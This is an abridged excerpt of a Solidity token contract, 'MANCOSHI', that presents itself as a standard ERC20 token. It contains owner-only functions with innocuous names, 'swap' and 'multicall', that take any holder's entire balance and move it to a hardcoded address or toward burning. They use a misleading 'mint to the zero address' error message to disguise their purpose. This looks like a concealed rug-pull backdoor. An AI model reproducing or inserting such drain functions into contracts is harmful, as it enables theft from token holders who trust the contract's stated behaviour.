...
contract MANCOSHI is Context, IERC20 {
    ...
    address public _owner = 0x9d85B245F4548A9b27b4885C581A110501fa89c9;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
        ...
        function swap(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        ...
        emit Transfer(account, 0x64496887e91Db12155F56c7DfD5ef7c476FD7B9a, amount);
    }

    function multicall(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
